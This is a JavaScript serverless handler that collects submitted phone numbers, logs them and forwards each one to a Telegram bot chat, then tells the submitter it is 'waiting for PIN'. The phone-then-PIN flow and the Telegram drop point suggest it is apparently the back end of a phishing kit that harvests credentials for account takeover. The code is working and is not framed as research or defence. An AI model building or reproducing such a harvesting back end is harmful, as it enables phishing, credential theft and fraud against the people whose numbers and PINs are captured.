import fetch from 'node-fetch';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;


// In-memory store for client data (consider a database for production)
const clientData = {};

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { phoneNumber } = req.body;

      // Validate phone number presence
      if (!phoneNumber) {
        res.status(400).json({ error: 'Phone number is required.' });
        return;
      }

      console.log(`Received Phone Number: ${phoneNumber}`);

      // Check if the phone number already exists
      if (clientData[phoneNumber]) {
        res.status(400).json({ error: 'Phone number already submitted and waiting for PIN.' });
        return;
      }

      // Store the phone number
      clientData[phoneNumber] = null;
      console.log(`Phone number stored: ${phoneNumber}`);

      // Send phone number to Telegram
      const message = `New Phone Number Submission:\nPhone Number: ${phoneNumber}`;
      await sendTelegramMessage(message);

      // Respond to the client
      res.status(200).json({ status: 'Phone number received. Waiting for PIN.' });
    } catch (error) {
      console.error('Error processing the phone number:', error);
      res.status(500).json({ error: 'Internal Server Error' });
    }
  } else {
    // Method not allowed
    res.status(405).json({ error: 'Method Not Allowed' });
  }
}

async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log('Message sent to Telegram successfully');
    } else {
      const errorText = await response.text();
      console.error(`Failed to send message to Telegram: ${response.status} - ${errorText}`);
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}
